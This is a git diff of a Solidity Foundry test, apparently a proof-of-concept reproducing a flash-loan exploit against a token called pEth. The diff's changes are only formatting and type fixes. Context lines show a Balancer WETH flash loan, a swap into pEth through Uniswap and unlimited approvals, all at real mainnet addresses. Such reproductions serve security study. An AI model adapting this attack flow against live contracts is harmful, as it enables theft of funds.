@@ -16,6 +16,7 @@ import "./../interface.sol";
 // Hacking God : https://www.google.com/
 
 contract ContractTest is Test {
+
     IWETH WETH = IWETH(payable(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));
     IERC20 pEth = IERC20(0x62aBdd605E710Cc80a52062a8cC7c5d659dDDbE7);
     IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
@@ -37,7 +38,7 @@ contract ContractTest is Test {
         console.log("Before Start: %d WETH", startWETH);
         address[] memory tokens = new address[](1);
         tokens[0] = address(WETH);
-        uint256[] memory amounts = new uint[](1);
+        uint256[] memory amounts = new uint256[](1);
         amounts[0] = amount;
         Balancer.flashLoan(address(this), tokens, amounts, "");
 
@@ -52,7 +53,7 @@ contract ContractTest is Test {
         uint256[] memory feeAmounts,
         bytes memory userData
     ) external {
-        address[] memory path = new address [](2);
+        address[] memory path = new address[](2);
         (path[0], path[1]) = (address(WETH), address(pEth));
         UniRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
             amounts[0], 0, path, address(this), type(uint256).max
@@ -77,4 +78,5 @@ contract ContractTest is Test {
         WETH.approve(address(UniRouter), type(uint256).max);
         pEth.approve(address(UniRouter), type(uint256).max);
     }
+
 }
